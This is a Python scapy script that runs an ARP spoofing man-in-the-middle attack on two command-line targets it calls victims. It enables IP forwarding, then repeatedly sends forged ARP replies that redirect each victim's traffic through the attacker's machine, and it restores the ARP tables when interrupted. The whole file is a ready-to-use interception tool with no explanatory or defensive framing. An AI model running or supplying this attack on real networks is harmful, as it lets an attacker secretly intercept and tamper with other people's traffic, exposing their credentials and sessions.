#!/usr/bin/env python
import optparse
import time
import scapy.all as scapy
import subprocess
from colorama import Fore
import re


def get_system_mac():
    result = subprocess.check_output(['ifconfig', 'eth0'])
    formatted_result = re.search(r'\w\w:\w\w:\w\w:\w\w:\w\w:\w\w', result.decode())
    return formatted_result.group(0)


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast / arp_request

    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    for client in answered:
        mac = client[1].hwsrc
        return mac


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip), psrc=source_ip,
                       hwsrc=get_mac(source_ip))
    scapy.send(packet, verbose=False)


def get_options():
    parser = optparse.OptionParser()
    parser.add_option('-a', '--alpha', dest='victim_1', help="Target A")
    parser.add_option('-b', '--bravo', dest='victim_2', help="Target B")
    (option, argument) = parser.parse_args()

    if not option.victim_1 or not option.victim_2:
        parser.error("[!] Target expected. Try --help for more info.")

    return option


opt = get_options()
packet_count = 0
victim_1 = opt.victim_1
victim_2 = opt.victim_2
system_mac = get_system_mac()

try:
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
    print('[!] Port forwarding is now ' + Fore.RED + 'active' + Fore.WHITE + '.')

    victim_1_formatted = Fore.RED + victim_1 + Fore.WHITE
    victim_2_formatted = Fore.GREEN + victim_2 + Fore.WHITE

    while True:
        print(
            f'[+] Spoofing {victim_1_formatted} => {victim_2_formatted} is at {Fore.YELLOW + system_mac + Fore.WHITE}')
        spoof(victim_1, victim_2)
        packet_count += 1
        time.sleep(1)
        print(
            f'[+] Spoofing {victim_2_formatted} => {victim_1_formatted} is at {Fore.YELLOW + system_mac + Fore.WHITE}')
        spoof(victim_2, victim_1)
        packet_count += 1
        time.sleep(1)

except KeyboardInterrupt:
    restore(victim_1, victim_2)
    restore(victim_2, victim_1)
    print(f'\b\b\nSent {packet_count} packets.')
    subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
    print('\b\b[!] Port forwarding is now ' + Fore.GREEN + 'inactive' + Fore.WHITE + '.')
    print("\b\b[x] Spoofing terminated.")
